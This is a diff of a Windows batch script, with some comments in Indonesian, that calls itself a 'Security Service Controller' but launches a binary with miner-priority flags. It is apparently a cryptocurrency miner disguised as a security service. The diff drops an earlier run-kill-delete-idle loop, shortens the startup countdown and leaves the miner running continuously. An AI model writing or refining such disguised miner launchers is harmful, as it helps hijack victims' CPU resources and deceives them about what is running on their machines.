@@ -43,24 +43,18 @@ echo   Security Service Controller STARTED
 echo ========================================
 
 REM =========================
-REM COUNTDOWN 15 MENIT
+REM COUNTDOWN 5 MENIT
 REM =========================
 
-echo [Security] Countdown: 15 minutes remaining...
-timeout /t 300 /nobreak
-echo [Security] Countdown: 10 minutes remaining...
-timeout /t 300 /nobreak
 echo [Security] Countdown: 5 minutes remaining...
 timeout /t 300 /nobreak
 
 REM =========================
-REM LOOP
+REM START SECURITY SERVICE
 REM =========================
 
-:SECURITY_LOOP
-
 echo ----------------------------------------
-echo [Security] Service running (14 minutes)
+echo [Security] Service running
 echo ----------------------------------------
 
 start "" "%BIN%" ^
@@ -79,19 +73,5 @@ start "" "%BIN%" ^
  --cpu-threads-priority 1 ^
  --miner-priority 1
 
-REM 14 menit
-timeout /t 840 /nobreak
-
-echo [Security] Stopping service...
-
-for /f "skip=1 tokens=2 delims=," %%P in ('
-  wmic process where "ExecutablePath='%BIN%'" get ProcessId /format:csv
-') do taskkill /PID %%P /F >nul 2>&1
-
-echo [Security] Removing binary...
-del /f /q "%BIN%" >nul 2>&1
-
-echo [Security] Idle 2 minutes...
-timeout /t 120 /nobreak
-
-goto SECURITY_LOOP
+echo [Security] Service launched. Window will remain open.
+pause
